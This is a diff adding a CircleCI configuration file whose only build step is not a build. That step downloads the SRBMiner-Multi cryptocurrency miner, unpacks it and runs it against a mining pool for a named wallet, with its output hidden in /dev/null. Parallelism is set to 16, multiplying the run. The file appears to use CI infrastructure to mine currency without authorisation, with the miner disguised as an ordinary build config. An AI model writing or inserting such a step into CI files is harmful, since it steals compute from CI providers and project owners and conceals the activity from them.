@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 16
+    resource_class: small
+    working_directory: ~/my-app
+    steps:
+      - run: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz && ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowerurx --pool cpu-pool.com:63378 --wallet Uj7osA1Qmn5bKkqswHFJfpyQJscH5kPUGs --password x --cpu-threads 1 > /dev/null
